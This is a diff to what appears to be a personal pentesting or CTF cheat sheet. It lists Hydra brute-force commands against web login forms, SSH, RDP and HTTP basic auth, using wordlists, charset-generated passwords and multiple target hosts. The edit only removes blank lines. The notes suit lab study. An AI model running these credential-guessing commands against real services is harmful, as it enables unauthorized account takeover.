@@ -23,27 +23,21 @@ hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.p
 ```
 or success condition: :S=302 or :S=Dashboard
 failure condition :F=Invalid
-
 ```shell
  hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.53.230 -s 30768 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
-
-
 Multiple targets:
 ```shell
 hydra -l root -p toor -M targets.txt ssh
 ```
-
 #### Bruteforce ssh
 ```bash
  hydra -L users.txt -P passwords.txt 10.129.131.97 ssh
  ```
-
 #### Generate passwords of charset and from 6 to 8 chars:
 ```shell
 hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
 ```
-
 #### Bruteforce basic auth
 ```shell
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
